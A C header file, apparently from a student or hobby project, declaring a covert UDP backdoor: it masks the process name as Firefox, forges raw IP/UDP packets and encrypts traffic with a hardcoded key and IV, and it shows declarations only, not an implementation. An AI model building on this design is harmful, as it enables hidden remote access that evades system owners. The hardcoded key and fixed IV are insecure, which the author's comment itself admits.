#ifndef NOT_A_BACKDOOR_H
#define NOT_A_BACKDOOR_H

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <stdbool.h>

#include <unistd.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/udp.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <sys/prctl.h>
#include "crypto.h"

// I promise i wont do encryption like this later
#define KEY "PASSWORD"
#define IV "01234567890123412501234560123456"

#define VERSION "1.0"
#define MASK "/usr/lib/firefox/firefox"
#define BUFF_SIZE 20
#define OUTPUT_SIZE 30

int forgepacket(unsigned char *ciphertext, char *buff, int size);
char *getInput();
void client(unsigned int source_addr, unsigned int dest_addr, unsigned short dest_port, unsigned char *data, int data_len);
void server(unsigned int source_addr, unsigned int dest_addr, unsigned short dest_port, bool isBackdoor);
// int decrypherRun(char *buff, int size, char *output);

int charToInt(char msg);
unsigned short in_cksum(unsigned short *, int);
unsigned int host_convert(char *);
void usage(char *);

void handleErrors(void);
int encrypt(unsigned char *plaintext, int plaintext_len, unsigned char *key, unsigned char *iv, unsigned char *ciphertext);
int decrypt(unsigned char *ciphertext, int ciphertext_len, unsigned char *key, unsigned char *iv, unsigned char *plaintext);

struct send_udp
{
    struct iphdr ip;
    struct udphdr udp;
} send_udp;

struct recv_udp
{
    struct iphdr ip;
    struct udphdr udp;
    char buffer[10000];
} recv_pkt;

/* From synhose.c by knight */
struct pseudo_header
{
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short udp_length;
    struct udphdr udp;
} pseudo_header;

#endif
